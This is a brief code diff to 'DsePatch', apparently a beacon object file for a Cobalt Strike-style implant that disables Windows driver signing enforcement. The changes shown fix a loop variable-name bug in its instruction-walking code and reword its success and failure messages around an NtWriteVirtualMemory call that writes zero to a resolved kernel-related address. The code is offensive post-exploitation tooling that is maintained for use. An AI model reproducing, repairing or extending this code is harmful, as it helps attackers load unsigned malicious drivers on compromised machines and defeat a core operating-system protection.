@@ -188,7 +188,7 @@ D_SEC( B ) VOID WINAPI DsePatch( _In_ PBEACON_API BeaconApi, _In_ PAPI Api )
 									break;
 								};
 							};
-							off = Off + Hde.len;
+							Off = Off + Hde.len;
 						} while ( Off < 256 );
 					};
 
@@ -221,9 +221,11 @@ D_SEC( B ) VOID WINAPI DsePatch( _In_ PBEACON_API BeaconApi, _In_ PAPI Api )
 					{
 						if ( ! Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Adr, &( DWORD ){ 0x0 }, sizeof( DWORD ), NULL ) ) 
 						{
-							BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "dsepatch disabled driver signing enforcement." ) ), 0x0 );
+							/* Yay :) */
+							BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "dsepatch: success." ) ) );
 						} else {
-							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not disable driver signing enforcement." ) ) );
+							/* Nos :( */
+							BeaconApi->BeaconPrintf( CALLBACK_ERROR,  C_PTR( G_SYM( "dsepatch: failure." ) ) );
 							goto Leave;
 						};
 					} else {
